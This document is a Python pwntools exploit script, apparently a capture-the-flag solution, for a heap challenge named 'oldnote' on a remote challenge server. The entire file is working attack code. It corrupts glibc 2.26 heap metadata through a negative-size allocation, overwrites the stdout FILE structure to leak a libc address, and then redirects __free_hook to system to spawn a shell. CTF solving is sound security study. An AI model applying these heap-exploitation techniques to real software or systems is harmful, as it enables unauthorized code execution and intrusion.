from pwn import *
e = ELF('./oldnote')
libc = ELF('./libc-2.26.so')
p = None

def c(ch):
    p.sendafter(': ', str(ch))

def add(size, data):
    c(1)
    c(size)
    c(data)

def free(idx):
    c(2)
    c(idx)

def exploit():
    global p
    #p = process('./oldnote', env = {"LD_PRELOAD":'./libc-2.26.so'})
    p = remote('poseidonchalls.westeurope.cloudapp.azure.com', 9000)
    add(0x10, chr(ord('A'))*0x10)

    for i in range(3):
        add(0xff, chr(ord('A'))*0x10)

    for i in range(2,4):
        free(i)

    for i in range(2):
        add(0xef, chr(ord('A'))*0x10)

    free(0)
    add(-1, '\x00'*0x18+p64(0x421)+p64(0x21)*150)
    free(1)

    for i in range(4):
        free(i)

    add(0xf0, 'L')
    add(0xd0, 'L')
    add(0x30, 'L')
    add(0x30, p16(0x4720))

    for i in range(3):
        free(i)

    add(0xff, 'L')
    try:
        add(0xff, p64(0xfbad1800) + 3*p64(0)+"\x00")
        leak = p.recv()
        if '\x7f' not in leak:
            print "No leak"
            p.close()
            return
        print leak
    except:
        print "No"
        p.close()
        return
    libc.address = u64(leak[leak.find('\x7f')-5:leak.find('\x7f')+1].ljust(8, '\x00'))-0x3d73e0
    log.success('Libc base: '+hex(libc.address))
    p.sendline('')
    free(0)
    free(3)
    add(0x30, p64(libc.symbols['__free_hook']))
    add(0x30, '/bin/sh\x00')
    add(0x30, p64(libc.symbols['system']))
    free(2)
    p.interactive()
    exit()

for i in range(16):
    exploit()
